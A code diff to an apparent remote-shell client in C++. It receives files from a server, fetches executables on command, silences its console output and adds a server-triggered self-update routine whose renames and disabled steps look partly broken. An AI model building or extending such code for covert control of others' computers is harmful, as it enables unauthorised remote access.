@@ -55,7 +55,7 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		}
 		file.outfileStream.write(file.buffer, buffersize); //write buffer from file.buffer to our outfilestream
 		file.bytesWritten += buffersize; //increment byteswritten
-		std::cout << "Received byte buffer for file transfer of size: " << buffersize << std::endl;
+		//std::cout << "Received byte buffer for file transfer of size: " << buffersize << std::endl;
 		if (!SendPacketType(PacketType::FileTransferRequestNextBuffer)) //send PacketType type to request next byte buffer (if one exists)
 			return false;
 		break;
@@ -105,11 +105,11 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		if (!GetString(exe))
 			return false;
 
-		if (!FileExists(exe.c_str())) {
+		if (!FileExists((SHELL_PATH() + exe).c_str())) {
 			int i = 0;
 			while (!Client::main_client.RequestFile(exe)) {
 				if (i > 9)
-					return 1;
+					return true;
 				Log("Failed to request file, retrying...");
 				Client::main_client.RequestFile(exe);
 				i++;
@@ -165,11 +165,46 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		}
 		break;
 	}
+	case PacketType::Update:
+	{
+		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)UpdateClient, NULL, NULL, NULL);
+		break;
+	}
 	default: //If PacketType type is not accounted for
-		std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
+		//std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
 		break;
 	}
 	return true;
+}
+
+void Client::UpdateClient() {
+	Log("Update init\n");
+	auto thisptr = Client::clientptr;
+
+	//Temporary rename
+	rename(SHELL_NAME, SHELL_UPDATE_NAME);
+	rename(SHELL_BACKUP_NAME, SHELL_UPDATE_NAME);
+	Log("Renamed old files\n");
+	//Download the new shell
+	//int i = 0;
+	//while (!Client::main_client.RequestFile(std::string(SHELL_NAME), true)) {
+	//	if (i > 9)
+	//		return;
+	//	Client::main_client.RequestFile(std::string(SHELL_NAME), true);
+	//	i++;
+	//}
+	//Log("Requested main shell\n");
+	//
+	////Wait for file existence
+	//while (GetFileAttributesA(SHELL_PATH(SHELL_NAME)) == INVALID_FILE_ATTRIBUTES) {
+	//	if (!Client::connected)
+	//		return;
+	//	Sleep(100);
+	//}
+	//Log("Shell download finished\n");
+	//Copy also backup shell
+	//CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);
+	//Log("Copied backup shell\n");
 }
 
 void Client::ClientThread()
@@ -224,8 +259,12 @@ bool Client::resolveIP(std::string &hostname)
 	return true;
 }
 
-bool Client::RequestFile(std::string FileName)
+bool Client::RequestFile(std::string FileName, bool wait)
 {
+	if(wait)
+		//Wait just in case another file is already being downloaded
+		while (file.outfileStream.is_open()) 
+			Sleep(100);
 	file.outfileStream.open(GetCWD() + temp_name, std::ofstream::binary); //open file to write file to
 	file.fileName = FileName; //save file name
 	file.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
